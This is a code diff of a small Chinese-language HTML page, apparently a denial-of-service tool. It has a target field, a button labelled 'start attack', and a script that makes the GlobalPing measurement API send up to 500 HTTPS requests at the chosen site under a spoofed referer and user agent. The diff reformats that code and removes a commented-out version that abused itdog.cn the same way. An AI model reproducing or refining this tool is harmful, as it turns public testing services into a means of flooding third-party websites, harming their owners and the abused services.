@@ -5,67 +5,46 @@
     <script src="https://unpkg.com/axios@1.1.2/dist/axios.min.js"></script>
   </head>
   <body>
-    目标地址(要求 HTTPS 访问，不带协议和 "/"): <input type="text" id="targrt" /><br />
-    <button onclick="onClick()" text="Fire!">开始攻击(查看控制台获取结果)</button><br />
+    目标地址(要求 HTTPS 访问，不带协议和 "/"):
+    <input type="text" id="targrt" /><br />
+    <button onclick="onClick()" text="Fire!">
+      开始攻击(查看控制台获取结果)</button
+    ><br />
     <noscript>抱歉，你的浏览器不支持 JavaScript!</noscript>
 
     <script>
-function onClick() {
-  var t = document.getElementById("targrt").value;
-  const axios = require('axios');
-  axios.post(
-    'https://api.globalping.io/v1/measurements',
-    {
-        'type': 'http',
-        'target': t,
-        'measurementOptions': {
-            'protocol': 'HTTPS',
-            'request': {
-                'method': 'GET'
+      function onClick() {
+        var t = document.getElementById("targrt").value;
+        const axios = require("axios");
+        axios.post(
+          "https://api.globalping.io/v1/measurements",
+          {
+            type: "http",
+            target: t,
+            measurementOptions: {
+              protocol: "HTTPS",
+              request: {
+                method: "GET"
+              }
+            },
+            locations: [],
+            inProgressUpdates: true,
+            limit: 500
+          },
+          {
+            headers: {
+              authority: "api.globalping.io",
+              accept: "*/*",
+              "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
+              "cache-control": "no-cache",
+              "content-type": "application/json",
+              referer: "https://google.com/",
+              "user-agent":
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
             }
-        },
-        'locations': [],
-        'inProgressUpdates': true,
-        'limit': 500
-    },
-    {
-        headers: {
-            'authority': 'api.globalping.io',
-            'accept': '*/*',
-            'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json',
-            'referer': 'https://google.com/',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
-        }
-    }
-); // GlobalPing
-  /*
-axios.post(
-    'https://www.itdog.cn/http/',
-    new URLSearchParams({
-        'line': '',
-        'host': 'https://' + t,
-        'host_s': t,
-        'check_mode': 'fast',
-        'ipv4': '',
-        'method': 'get',
-        'referer': 'https://baidu.com/s',
-        'ua': 'AGA/1.2',
-        'cookies': ''
-    }),
-    {
-        headers: {
-            'authority': 'www.itdog.cn',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8',
-            'cache-control': 'no-cache',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
-        }
-    }
-); // ITDOG.CN
-      */
-}
+          }
+        ); // GlobalPing
+      }
     </script>
   </body>
 </html>
